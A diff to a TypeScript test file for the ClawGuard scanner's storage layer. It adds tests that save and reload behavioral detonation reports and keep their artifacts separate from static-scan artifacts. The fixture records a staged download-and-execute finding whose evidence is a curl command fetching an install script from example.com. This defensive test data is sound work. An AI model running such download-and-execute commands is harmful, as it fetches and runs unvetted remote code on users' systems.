@@ -4,7 +4,12 @@ import { tmpdir } from "node:os";
 import path from "node:path";
 import { test, type TestContext } from "node:test";
 
-import type { ReportSummary, ScanRecord, StaticScanReport } from "@clawguard/contracts";
+import type {
+  DetonationReport,
+  ReportSummary,
+  ScanRecord,
+  StaticScanReport,
+} from "@clawguard/contracts";
 
 import { ClawGuardStorage } from "./database.js";
 
@@ -73,6 +78,38 @@ function buildStaticReport(
   };
 
   return { summary, report };
+}
+
+function buildDetonationReport(scan: ScanRecord, requestId: string): DetonationReport {
+  return {
+    request: {
+      requestId,
+      snapshot: {
+        slug: scan.slug,
+        path: "/tmp/calendar-helper",
+        sourceHints: [{ kind: "fixture", detail: "storage test" }],
+        contentHash: scan.contentHash,
+        fileInventory: ["SKILL.md"],
+        detectedAt: scan.startedAt,
+      },
+      prompts: ["run"],
+      timeoutSeconds: 90,
+    },
+    summary: "Behavioral detonation observed a staged download-and-execute chain.",
+    findings: [
+      {
+        ruleId: "CG-DET-STAGED-DOWNLOAD-EXECUTE",
+        severity: "critical",
+        message: "Behavioral detonation observed a staged download-and-execute chain.",
+        evidence: ["Executed /usr/bin/curl https://example.com/install.sh"],
+      },
+    ],
+    score: 90,
+    recommendation: "block",
+    triggeredActions: ["/usr/bin/curl https://example.com/install.sh"],
+    artifacts: [],
+    generatedAt: "2026-03-12T00:02:00.000Z",
+  };
 }
 
 test("ClawGuardStorage loads the same stored report by slug and content hash", async (t) => {
@@ -160,4 +197,101 @@ test("ClawGuardStorage returns undefined for an unknown report content hash", as
   const stored = await storage.getLatestStaticReportByContentHash("sha256:missing");
 
   assert.equal(stored, undefined);
+});
+
+test("ClawGuardStorage persists and reloads detonation runs by slug and content hash", async (t) => {
+  const storage = createStorageFixture(t);
+  const scan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
+  const report = buildDetonationReport(scan, "det-001");
+
+  await storage.persistScan({ scan });
+  await storage.persistDetonationRun({
+    status: {
+      requestId: "det-001",
+      scanId: scan.scanId,
+      slug: scan.slug,
+      contentHash: scan.contentHash,
+      status: "completed",
+      runtime: "podman",
+      startedAt: "2026-03-12T00:01:00.000Z",
+      completedAt: "2026-03-12T00:02:00.000Z",
+    },
+    report,
+  });
+  await storage.writeJsonArtifact({
+    scanId: scan.scanId,
+    type: "detonation-report-json",
+    filename: "det-001.detonation-report.json",
+    value: report,
+  });
+  await storage.writeArtifact({
+    scanId: scan.scanId,
+    type: "detonation-trace",
+    filename: "det-001.trace.txt",
+    data: "trace",
+    mimeType: "text/plain",
+  });
+
+  const bySlug = await storage.getLatestDetonationRunBySlug(scan.slug);
+  const byHash = await storage.getLatestDetonationRunByContentHash(scan.contentHash);
+
+  assert.ok(bySlug);
+  assert.ok(byHash);
+  assert.equal(bySlug.status.requestId, "det-001");
+  assert.equal(byHash.status.requestId, "det-001");
+  assert.equal(bySlug.report?.recommendation, "block");
+  assert.equal(bySlug.artifacts.length, 2);
+});
+
+test("ClawGuardStorage keeps static and detonation artifact reads separate", async (t) => {
+  const storage = createStorageFixture(t);
+  const scan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
+  const { summary, report } = buildStaticReport(
+    scan,
+    "report-calendar-helper-sha256:fixtu",
+    "2026-03-12T00:01:00.000Z",
+  );
+  const detonationReport = buildDetonationReport(scan, "det-001");
+
+  await storage.persistScan({ scan });
+  await storage.persistStaticReport({ summary, report });
+  await storage.persistDetonationRun({
+    status: {
+      requestId: "det-001",
+      scanId: scan.scanId,
+      slug: scan.slug,
+      contentHash: scan.contentHash,
+      status: "completed",
+      runtime: "podman",
+      startedAt: "2026-03-12T00:01:00.000Z",
+      completedAt: "2026-03-12T00:02:00.000Z",
+    },
+    report: detonationReport,
+  });
+  await storage.writeJsonArtifact({
+    scanId: scan.scanId,
+    type: "report-json",
+    filename: "report.json",
+    value: { summary, report },
+  });
+  await storage.writeJsonArtifact({
+    scanId: scan.scanId,
+    type: "detonation-report-json",
+    filename: "det-001.detonation-report.json",
+    value: detonationReport,
+  });
+
+  const storedStatic = await storage.getStaticReport(report.reportId);
+  const storedDetonation = await storage.getDetonationRun("det-001");
+
+  assert.ok(storedStatic);
+  assert.ok(storedDetonation);
+  assert.equal(
+    storedStatic.artifacts.every((artifact) => artifact.type === "report-json"),
+    true,
+  );
+  assert.equal(
+    storedDetonation.artifacts.every((artifact) => artifact.type !== "report-json"),
+    true,
+  );
 });
